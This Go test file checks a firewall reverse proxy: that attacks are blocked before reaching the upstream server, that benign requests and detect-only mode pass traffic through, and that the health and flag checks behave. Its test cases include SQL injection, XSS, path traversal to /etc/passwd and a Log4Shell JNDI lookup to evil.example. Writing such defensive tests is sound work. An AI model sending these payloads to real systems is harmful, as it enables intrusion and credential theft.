// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package main

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/middleware"
)

// buildHandler assembles the same handler run() builds, against a live upstream,
// so the test exercises the real glue rather than a re-implementation of it.
func buildHandler(t *testing.T, upstream string, o options) http.Handler {
	t.Helper()
	target, err := url.Parse(upstream)
	if err != nil {
		t.Fatalf("parse upstream: %v", err)
	}
	wafOpts := []gwaf.Option{gwaf.WithBlockStatus(o.blockStatus)}
	if o.detectOnly {
		wafOpts = append(wafOpts, gwaf.WithMode(gwaf.DetectionOnly))
	}
	waf, err := gwaf.New(wafOpts...)
	if err != nil {
		t.Fatalf("gwaf.New: %v", err)
	}
	rp := newReverseProxy(target, o.upstreamTimeo, newLogger(false))
	h := middleware.HTTP(waf,
		middleware.WithBlockHandler(blockHandler(o, newLogger(false))),
	)(rp)
	if o.healthPath != "" {
		h = withHealth(o.healthPath, h)
	}
	return h
}

// TestProxyBlocksAttacksAndForwardsBenign is the whole point of the binary: an
// attack is stopped at the proxy and never reaches the upstream, while a benign
// request is forwarded and its response returned unchanged. The upstream records
// whether it was reached, which is what distinguishes "blocked" from "allowed
// but the upstream happened to 404".
func TestProxyBlocksAttacksAndForwardsBenign(t *testing.T) {
	var reached int
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached++
		w.Header().Set("X-Upstream", "hit")
		_, _ = io.WriteString(w, "upstream saw: "+r.URL.String())
	}))
	defer upstream.Close()

	o := options{blockStatus: http.StatusForbidden, upstreamTimeo: 0}
	h := buildHandler(t, upstream.URL, o)
	front := httptest.NewServer(h)
	defer front.Close()

	cases := []struct {
		name       string
		path       string
		wantStatus int
		wantReach  bool
	}{
		{"benign", "/product?id=42", http.StatusOK, true},
		{"sqli", "/product?id=1%20UNION%20SELECT%20pw%20FROM%20users", http.StatusForbidden, false},
		{"xss", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", http.StatusForbidden, false},
		{"traversal", "/download?file=../../../../etc/passwd", http.StatusForbidden, false},
		{"wp-config", "/wp-config.php", http.StatusForbidden, false},
		{"log4shell-header", "/", http.StatusOK, true}, // header set below decides it
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			before := reached
			req, _ := http.NewRequest(http.MethodGet, front.URL+c.path, nil)
			if c.name == "log4shell-header" {
				req.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
				c.wantStatus = http.StatusForbidden
				c.wantReach = false
			}
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("request: %v", err)
			}
			resp.Body.Close()

			if resp.StatusCode != c.wantStatus {
				t.Errorf("status = %d, want %d", resp.StatusCode, c.wantStatus)
			}
			if got := reached > before; got != c.wantReach {
				t.Errorf("upstream reached = %v, want %v", got, c.wantReach)
			}
		})
	}
}

// TestDetectOnlyForwardsEverything is the rollout path: in detect-only mode even
// an attack is forwarded, so an operator can measure what would be blocked
// before turning enforcement on. The block handler must never fire.
func TestDetectOnlyForwardsEverything(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer upstream.Close()

	o := options{blockStatus: http.StatusForbidden, detectOnly: true}
	front := httptest.NewServer(buildHandler(t, upstream.URL, o))
	defer front.Close()

	resp, err := http.Get(front.URL + "/product?id=1%27%20OR%201=1--")
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("detect-only status = %d, want 200 (attack forwarded, not blocked)", resp.StatusCode)
	}
}

// TestHealthShortCircuits confirms the liveness path answers without touching the
// upstream, so a health check does not depend on the backend being up.
func TestHealthShortCircuits(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("upstream must not be reached for a health check")
	}))
	upstream.Close() // deliberately down: the health path must not need it

	o := options{blockStatus: http.StatusForbidden, healthPath: "/healthz"}
	front := httptest.NewServer(buildHandler(t, upstream.URL, o))
	defer front.Close()

	resp, err := http.Get(front.URL + "/healthz")
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || !strings.Contains(string(body), "ok") {
		t.Errorf("health = %d %q, want 200 ok", resp.StatusCode, body)
	}
}

// TestParseFlagsRejectsBadInput guards the operator-facing contract: a missing
// upstream and a half-configured TLS pair are errors, not silent misconfigurations.
func TestParseFlagsRejectsBadInput(t *testing.T) {
	if _, err := parseFlags(nil); err == nil {
		t.Error("expected error for missing -upstream")
	}
	if _, err := parseFlags([]string{"-upstream", "http://x", "-tls-cert", "c.pem"}); err == nil {
		t.Error("expected error for -tls-cert without -tls-key")
	}
	if _, err := parseFlags([]string{"-upstream", "http://x"}); err != nil {
		t.Errorf("valid flags rejected: %v", err)
	}
}
